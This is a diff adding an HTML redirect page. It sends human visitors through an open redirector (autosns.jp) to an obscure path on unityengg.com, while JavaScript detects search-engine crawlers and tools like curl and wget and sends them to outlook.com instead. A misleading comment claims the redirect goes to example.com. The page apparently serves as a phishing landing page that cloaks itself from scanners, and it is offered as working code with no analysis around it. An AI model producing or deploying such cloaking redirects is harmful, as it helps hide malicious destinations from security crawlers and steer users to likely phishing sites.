@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="5;url=https://autosns.jp/r/?u=unityengg.com/guddy/colt/hhhh/"> <!-- Redirect users to example.com after 5 seconds -->
+    <title>Redirecting...</title>
+</head>
+<body>
+    <h1>Please Wait...</h1>
+    <script>
+        // Function to check if the user agent contains bot-related keywords
+        function isBot() {
+            var botKeywords = ['bot', 'google', 'bing', 'yahoo', 'baidubot', 'duckduck', 'yandexbot', 'slurp', 'teoma', 'spider', 'crawler', 'curl', 'wget', 'bot/'];
+            var userAgent = navigator.userAgent.toLowerCase();
+            return botKeywords.some(function(keyword) {
+                return userAgent.indexOf(keyword) !== -1;
+            });
+        }
+
+        // Check if the visitor is a bot
+        if (isBot()) {
+            // Redirect bots to a different website
+            window.location.href = 'https://outlook.com';
+        }
+    </script>
+</body>
+</html>
